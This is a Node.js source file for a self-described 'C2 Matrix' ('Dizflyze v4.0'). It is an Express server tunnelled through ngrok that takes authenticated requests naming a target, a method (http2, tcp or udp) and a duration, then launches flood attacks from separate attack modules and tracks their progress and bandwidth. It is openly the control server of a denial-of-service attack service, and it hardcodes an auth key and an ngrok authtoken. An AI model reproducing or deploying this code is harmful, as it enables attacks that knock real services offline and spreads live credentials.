require('colors');
const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const https = require('https');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const app = express();
const bodyParser = require('body-parser');

// Enhanced Configuration
const CONFIG = {
  PORT: process.env.PORT || 3000,
  AUTH_KEY: 'D!zFlyz3_S3cr3tK3y',
  MAX_DURATION: 300,
  WORKERS: os.cpus().length,
  RATE_LIMIT: 1000,
  NGROK_REGION: 'ap'
};

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`.yellow);
  for (let i = 0; i < CONFIG.WORKERS; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died`.red);
    cluster.fork();
  });
} else {
  const attacks = new Map();
  let ngrokUrl = '';

  const L = () => {
    console.log(`
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
  ⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze v4.0
  ⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] C2 Matrix
  ⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Workers: ${CONFIG.WORKERS}
  ⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Threads: ${os.cpus().length}
  ⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
  ⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
  ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    `.cyan);
  };

  const initNgrok = async () => {
    try {
      await ngrok.authtoken('2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa');
      ngrokUrl = await ngrok.connect({
        proto: 'http',
        addr: CONFIG.PORT,
        region: CONFIG.NGROK_REGION
      });
      console.log(`${'🚀'.cyan} C2 Endpoint: ${ngrokUrl.underline}`);
    } catch (e) {
      console.log(`\n${'×'.red} NGROK ERROR: ${e.message}`);
      process.exit(1);
    }
  };

  const generatePayload = () => {
    const vectors = {
      http2: require('./attack-http2'),
      tcp: require('./attack-tcp'),
      udp: require('./attack-udp')
    };
    return vectors;
  };

  app.use(bodyParser.json());
  app.use((req, res, next) => {
    if (req.headers['x-auth-key'] !== CONFIG.AUTH_KEY) {
      return res.status(403).json({ status: 'UNAUTHORIZED' });
    }
    next();
  });

  app.post('/api/attack', async (req, res) => {
    try {
      const { target, method = 'http2', duration } = req.body;
      const attackId = crypto.randomBytes(16).toString('hex');
      
      if (!['http2', 'tcp', 'udp'].includes(method)) {
        return res.status(400).json({ error: 'Invalid method' });
      }

      const attack = {
        id: attackId,
        target,
        method,
        start: Date.now(),
        duration: Math.min(duration, CONFIG.MAX_DURATION),
        stats: {
          requests: 0,
          errors: 0,
          bandwidth: 0
        }
      };

      attacks.set(attackId, attack);
      generatePayload()[method](attack, attacks);
      
      res.json({
        status: 'DEPLOYED',
        attackId,
        method,
        duration: attack.duration,
        endpoint: `${ngrokUrl}/api/attack/${attackId}`
      });
    } catch (e) {
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });

  app.get('/api/attack/:id', (req, res) => {
    const attack = attacks.get(req.params.id);
    if (!attack) return res.status(404).json({ error: 'Not found' });
    
    const progress = {
      elapsed: Date.now() - attack.start,
      remaining: attack.duration * 1000 - (Date.now() - attack.start),
      percentage: Math.min(((Date.now() - attack.start) / (attack.duration * 1000)) * 100, 100),
      ...attack.stats
    };
    
    res.json(progress);
  });

  app.delete('/api/attack/:id', (req, res) => {
    attacks.delete(req.params.id);
    res.json({ status: 'TERMINATED' });
  });

  const startServer = () => {
    app.listen(CONFIG.PORT, () => {
      L();
      console.log(`${'⚡'.green} Worker ${process.pid} ready`.yellow);
      initNgrok();
    });
  };

  startServer();
}
